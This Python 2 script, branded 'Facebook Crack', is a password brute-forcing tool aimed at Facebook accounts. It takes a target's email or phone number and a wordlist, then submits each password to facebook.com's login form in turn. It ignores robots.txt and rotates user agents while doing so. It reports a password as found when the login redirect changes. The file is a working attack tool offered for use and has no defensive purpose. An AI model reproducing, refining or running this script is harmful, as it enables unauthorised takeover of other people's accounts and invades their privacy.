#!/usr/bin/env python 
# -*- coding: UTF-8 -*-

import sys
import mechanize
import cookielib
import random




email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))


passwordlist = str(raw_input("Enter the wordlist name and path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """
         
         
         
 
              .+hNNMMMMMNNdyo/:-..-:/ss/   .:oydmds+:`
              `sNMMMMMMMMMMMMMMMMNNNNMN+`  /hNMMMs-`
           `dMMmddmNMMMMMMMMMMmhMMMh.  `hMMMMN:
           sNo-`````.:/oooo/:.+NMMs  `dMMMMMo
          o.               `yMMMh`  oMMMMMM-
                          .dMMMM-   mMMMMMM:
                         `mMMMMm   .MMMMMMM+
                         yMMMMMh   `MMMMMMMy
                        .MMMMMMd   `NMMMMMMm
                        /MMMMMMN`   NMMMMMMm
                        /MMMMMMM-   mMMMMMMm
                        -MMMMMMM/   hMMMMMMm
                 .+shhhhhMMMMMMM+   yMMMMMMd
                +dmNNMMMMMMMMMMMo   oMMMMMMy
                ....-:smMMMMMMMMs   oMMMMMM+
                      `sMMMMMMMs    oMMMMMN.
                      dMMMMMMo     yMMMMMs
              `-+oo+/hMMMMMM/     `mMMMMm`
               ./shmMMMMMMMMN`   /MMMMm-
                  .+mMMMMMMy    `mMMMd.
                   .NMMMMN.    `hMMNo`
                   yMMMN:    .hMNy-
                   yMMN:    `/mNs-    ```````
                  :NMm- ` :hdo--/+syhddddddhys+-`
                  :NMd-:hMNdmNMMMMMMMMMMMMMMMMMNh+.`  .+.
                  `sMMhodMMMMMMMMMMMMMMMMMMMMMMMMMMMMhshNd/
                `/mMMMNMNNmmhhyyyyyhdmNNMMMMMMMMMMMMMMMd/
             `+mMNmho+:.`            `.:+ymNMMMMMMMMh:
            ody+:`                         ./hNMMNh-
               `                                 `/s-        
        +=========================================+
        |..........   Facebook Crack   ...........|
        +-----------------------------------------+
        |           #Author:☆Light_ID☆           | 
        |	              Version 1.0               |
        |          #☆WARCEU ROOT CYBER☆#         |
       	|        whatsapp:"Ora punya mamank       | 
        |      "gunakan dengan bijak ya tod :v    |
        |  "jangan di recode tod,cape ngoding nya |
        +=========================================+
        |..........  Facebook Cracker  ...........|
        +-----------------------------------------+\n\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
